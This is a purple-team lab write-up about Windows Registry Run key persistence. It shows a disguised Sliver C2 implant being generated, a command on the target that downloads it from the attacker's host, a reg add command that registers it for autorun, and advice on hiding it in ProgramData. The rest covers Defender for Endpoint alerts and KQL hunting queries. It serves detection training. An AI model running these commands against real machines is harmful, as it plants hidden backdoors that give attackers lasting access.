# Run Key Persistence via Sliver C2  
**Technique: [T1547.001 – Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)**

The Windows Registry is a prime target for attackers seeking user-level persistence. This technique abuses the `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` key, causing the payload to automatically execute each time the user signs in.

This test uses a [Sliver C2](https://github.com/BishopFox/sliver) payload to simulate adversary behavior, with [Microsoft Defender for Endpoint (MDE)](https://www.microsoft.com/en-us/security/business/threat-protection/microsoft-defender-endpoint) active on the target.

> Threat groups like APT29, FIN7, and Lazarus have been observed using this technique due to its reliability, stealth, and survivability across reboots.

## Host Configuration

- **Attacker VM:** `HR-COMPLAINTS` (Sliver C2 on Ubuntu 22.04)
  - **IP:** `10.1.0.51`
- **Target VM:** `CEO-LAPTOP` (Windows 10 with MDE onboarded)
  - **IP:** `10.1.0.69`
  - **Admin Username:** `TrustMeBro`

<summary><strong>🔹 Step 1: Generate and Host Payload (Attacker VM)</strong></summary>

&nbsp;

From `HR-COMPLAINTS`, we generate a Windows executable using [Sliver C2](https://github.com/BishopFox/sliver):

```
# Start Sliver
sudo sliver

# Inside Sliver console:
generate --os windows --format exe --name WindowsTelemetryService --http https://10.1.0.51
```

> `WindowsTelemetryService.exe` is a disguised payload name to blend in with legitimate telemetry binaries often found on Windows systems.

Next, host the payload via Python on port 80 (commonly allowed traffic):

```
sudo python3 -m http.server 80
```

</details>

---

<details>
<summary><strong>🔹 Step 2: Download Payload & Add Run Key (Target VM)</strong></summary>

&nbsp;

From `CEO-LAPTOP`, use PowerShell to download the payload:

```
wget "http://10.1.0.51/WindowsTelemetryService.exe" -OutFile "C:\ProgramData\WindowsTelemetryService.exe"
```
> **ℹ️ Note:**  
> The payload is saved to `C:\ProgramData` — a legitimate, writable directory used by many applications for storing data.  
> This location is often overlooked by users, doesn’t require elevated permissions, and doesn’t trigger the same suspicion as more obvious paths like `Downloads` or `Temp`.  
> Attackers commonly abuse `ProgramData` for hiding payloads while maintaining system compatibility.


Then add it to the Run key:

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V "WindowsTelemetryService" /t REG_SZ /F /D "C:\ProgramData\WindowsTelemetryService.exe"
```

> This causes the payload to execute every time the user signs in. The `HKCU` hive applies to the current user only — commonly abused in malware that operates without needing elevated privileges.

</details>

---

<details>
<summary><strong>🔹 Step 3: Reboot & Observe Callback</strong></summary>

&nbsp;

Sign out and back into the `TrustMeBro` user session on `CEO-LAPTOP`. Sliver should receive a callback, establishing a new session tied to the registry-based persistence mechanism.  

<img width="451" height="240" alt="signing_out_of_windows_host" src="https://github.com/user-attachments/assets/fa2e9ff8-3183-4016-8f2d-e8e1f032e23c" />  

&nbsp;
You can verify the beacon using:

```
sessions
```


This confirms successful execution of the backdoor through the `HKCU\Run` registry key.

> This session was created after triggering the Registry run key. We can see the unique session ID, which is a randomly generated GUID (a.k.a UUID).
> Only the first part of the GUID is shown in this output.

## Alert Triage via Microsoft Defender for Endpoint (MDE)

Before diving into custom hunting, we start by reviewing what Microsoft Defender for Endpoint surfaced on its own.

From the MDE portal, we navigate to **Incidents & Alerts** to review detections related to our persistence activity.

- Defender generated an incident tied to `WindowsTelemetryService.exe`
- The alert noted unusual persistence behavior — flagged as *"Persistence via Run Key"* and *"Startup Folder Executable Execution"*
- The alerts were linked to the user `TrustMeBro` and the device `CEO-LAPTOP`
- Timestamps aligned closely with our simulated sign-in events

<img width="1784" height="153" alt="checking_mde_incidents_tab_reg_key" src="https://github.com/user-attachments/assets/275c1ef5-36c3-4d37-b4b8-c964faee15c6" />


These detections show that MDE is aware of these persistence vectors, and considers the user's registry run keys a senstive area.  

If we check the timeline on this host, we find not just the alerts that were triggered, but gain additional context of what happened minutes before:  
<img width="1854" height="327" alt="entire_attack_timeline" src="https://github.com/user-attachments/assets/015dc073-a5ba-4da8-9544-49e2dc932b2d" />  

In the image above, we can see a suspicious download from PowerShell from a remote internal host, `10.1.0.51:80`.


> 💡 While it's valuable that alerts were triggered, advanced attackers often find ways to bypass default detections.

## Pivoting to KQL Hunting

Alerts are a great starting point but defenders can’t rely on them alone. Imagine the attack was successful **without** triggering alers, then what?:

We pivot to **custom KQL queries** to validate, expand, and contextualize what MDE saw.

Our first hunt focuses on **Registry Run Key modifications**, looking for entries under the classic `*\Run` path:

```kql
DeviceRegistryEvents
| where RegistryKey has @"\Microsoft\Windows\CurrentVersion\Run"
| where ActionType == "RegistryValueSet"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| sort by Timestamp desc
```

<img width="1217" height="662" alt="kql_run_key_modifications" src="https://github.com/user-attachments/assets/45f626ab-6545-4a1d-b969-316e80e8a67b" />  

This quickly surfaces our suspicious entry:

- **RegistryValueName:** `WindowsTelemetryService`
- **RegistryValueData:** `C:\ProgramData\WindowsTelemetryService.exe`
- **InitiatingProcess:** `reg.exe`, run by `TrustMeBro`

This gives us full visibility into what was written, by whom, and when.  

### Pivot: Confirming Execution of the Suspicious Binary

Now that we know the payload was written to disk, the next logical question is:

> “Did it actually execute?”

We query for executions of `WindowsTelemetryService.exe`:

```kql
DeviceProcessEvents
| where FileName =~ "WindowsTelemetryService.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath, InitiatingProcessFileName
| sort by Timestamp desc
```

This query confirms **two executions** of `WindowsTelemetryService.exe` — one for each persistence method:

- **Autorun via Registry Run Key**
- **Startup Folder Drop**

> Since both methods were tested during this simulation, you’ll see evidence of each.

👉 For full context on the **Startup Folder** technique seen below, 
see the [T1547.009_startupfolder_C2_sliver.md](https://github.com/j-manli/adversary-tradecraft-study/blob/main/03_persistence/startup_folder/T1547.009_startupfolder_C2_sliver.md) writeup.

---

### Pivot: How Did This File Get Here?

With execution confirmed, the next question becomes:  
**Was this payload dropped manually or downloaded from a remote host?**

We use a `DeviceNetworkEvents` query to investigate outbound network activity from `CEO-LAPTOP` during the relevant window:

```kql
DeviceNetworkEvents
| where DeviceName == "ceo-laptop"
| where Timestamp between (datetime(2025-07-13 02:30:00) .. datetime(2025-07-13 02:45:00))
| project Timestamp, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

This revealed a connection to the attacker's IP (`10.1.0.51`) on `port 80`, initiated via `PowerShell`.  

---

### Pivot: Investigate Communication with `10.1.0.51`?

To build a fuller picture of malicious activity, we pivoted on the remote IP `10.1.0.51` — the attacker's host — to identify any other connections from `CEO-LAPTOP`:

```kql
DeviceNetworkEvents
| where DeviceName == "ceo-laptop"
| where RemoteIP == "10.1.0.51"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<img width="1699" height="629" alt="powershell_and_suspicious_process_remote_connection_kql" src="https://github.com/user-attachments/assets/fa6ec06b-64c6-4184-99f1-134068f359a9" />

This revealed multiple outbound connections initiated by `powershell.exe`, confirming the payload delivery and beaconing behavior.  

> Again, note that this output included a test for Startup Folder persistence which is why there are multiple callbacks.

Notably:
- The connection occurred shortly after persistence was established.
- The `InitiatingProcessFileName` confirms use of `WindowsTelemetryService.exe` and corresponds TCP connections to `RemoteIP: 10.1.0.51:443`
- Evidence of download from that same `RemoteIP` over `port 80`

Together, this ties process execution, file delivery, and outbound C2 into a single timeline.

## Conclusion: Chaining Autoruns with C2

This scenario demonstrated how adversaries can maintain persistence using simple, low-noise autorun techniques—leveraging the Registry and Startup folder to regain access after reboot. Microsoft Defender for Endpoint flagged some activity, but critical links between execution and callback required hunting context.
